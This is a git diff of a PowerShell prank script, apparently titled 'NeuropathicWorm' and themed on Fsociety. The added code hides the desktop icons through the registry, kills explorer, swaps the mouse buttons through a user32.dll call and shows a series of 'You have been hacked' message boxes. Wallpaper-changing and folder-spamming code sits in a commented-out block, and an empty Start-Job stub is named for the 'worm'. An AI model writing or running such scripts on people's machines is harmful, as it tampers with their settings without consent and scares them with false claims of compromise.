@@ -1,28 +1,50 @@
-﻿[System.Windows.Forms.MessageBox]::Show("Hello Friend", "Hacked!")
-Write-Host "Una cosa"
-echo "Otra Cosa"
-$variable = "Hola" 
-if ($variable -eq "Hola"){
-    echo "Tst"
-}
-else{
-    echo "LOl"
-}
+﻿#Methods for change the PC configurations
 
-Function Set-WallPaper($Value)
+<# begining method 4 hide icons in the pc#>
+$Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
+Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
+Get-Process "explorer"| Stop-Process
+<# end method 4 hide icons in the pc#>
+
+<# begining method 4 swap the left click#>
+[Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
+
+$SwapButtons = Add-Type -MemberDefinition @'
+[DllImport("user32.dll")]
+public static extern bool SwapMouseButton(bool swap);
+'@ -Name "NativeMethods" -Namespace "PInvoke" -PassThru
+
+$SwapButtons::SwapMouseButton(!([System.Windows.Forms.SystemInformation]::MouseButtonsSwapped))
+<# end method 4 swap the left click#>
+<#begining 4 sending messages#>
+$messages = @('You have been hacked', 'You cannot do anything', 'We are Fsociety', 'Now you are going to know how is have neuropathic')
+for ( $index = 0; $index -lt $messages.count; $index++)
+    {
+        [System.Windows.Forms.MessageBox]::Show($messages[$index], 'Hacked!!')
+    }
+<#end 4 sending messages#>
+
+#Process in services for execute some annoying methods
+-Start-Job -Name NeuropathicWorm -ScriptBlock { 
+
+}
+<# 
+Function Set-WallPaper()
 {
- Set-ItemProperty -path 'HKCU:\Control Panel\Desktop\' -name wallpaper -value $value
- rundll32.exe user32.dll, UpdatePerUserSystemParameters
+    
 }
 
-Set-WallPaper -value "C:\Users\edosa\Downloads\NeutopathicWorm\fsociety.jpg"
-
-try{
-Set-WallPaper -value "fsociety.jpg"
-}catch{
-  Write-Host "An error occurred:"
-  Write-Host $_
+ Set-WallPaper -value "fsociety.jpg"
+Function Set-Desktop(){
+    $desktop = $env:USERPROFILE + "\desktop"
+    Set-Location $desktop
 }
-mkdir troll
-pause
+
+Set-Desktop
+
+for($i=0; $i -lt 5; $i++){
+mkdir troll+"$i"
+}
+ #>
+
 exit
